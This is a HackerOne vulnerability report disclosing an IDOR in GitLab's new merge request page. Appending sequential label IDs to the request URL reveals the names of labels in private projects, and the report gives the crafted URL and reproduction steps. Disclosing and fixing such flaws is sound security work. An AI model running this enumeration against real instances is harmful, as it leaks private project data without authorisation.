# Get all labels from gitlab IDOR- new Merge requests endpoint

**[HackerOne report #507113](https://hackerone.com/reports/507113)** by `ashish_r_padelkar` on 2019-03-09, assigned to `hackerjuan`:

**Summary:**

It is possible to get all label names from gitlab by enumerating through label IDs irrespective of project visibility settings. I.e you can get names of labels which belongs to private projects too.

**Description:**

When you create a new merge request, the url looks like below

```
https://gitlab.com/<UserName>/<ProjectName>/merge_requests/new?utf8=%E2%9C%93&merge_request%5Bsource_project_id%5D=<ID>&merge_request%5Bsource_branch%5D=master1&merge_request%5Btarget_project_id%5D=<ID>&merge_request%5Btarget_branch%5D=master
```

Now if you append the parameter `&merge_request[label_ids][]=<LabelID>` in above request, the name of the label will be populated in `Labels` dropdown in UI

So the final request would be

```
https://gitlab.com/<UserName>/<ProjectName>/merge_requests/new?utf8=%E2%9C%93&merge_request%5Bsource_project_id%5D=<ID>&merge_request%5Bsource_branch%5D=master1&merge_request%5Btarget_project_id%5D=<ID>&merge_request%5Btarget_branch%5D=master&merge_request[label_ids][]=<LabelID>
```

## Steps To Reproduce:

1. As a project member of any project with capabilities of creating merge requests, click on creating new merge request
2. You will be navigated to the url something like below

```
https://gitlab.com/<UserName>/<ProjectName>/merge_requests/new?utf8=%E2%9C%93&merge_request%5Bsource_project_id%5D=<ID>&merge_request%5Bsource_branch%5D=master1&merge_request%5Btarget_project_id%5D=<ID>&merge_request%5Btarget_branch%5D=master
```

3. Append `&merge_request[label_ids][]=<LabelID>` in above url
4. Name of the label will be populated in the `Labels` dropdown in UI.
5. As this is sequential ID, we can enumerate all gitlab labels irrespective of project visibility settings

Regards,

Ashish
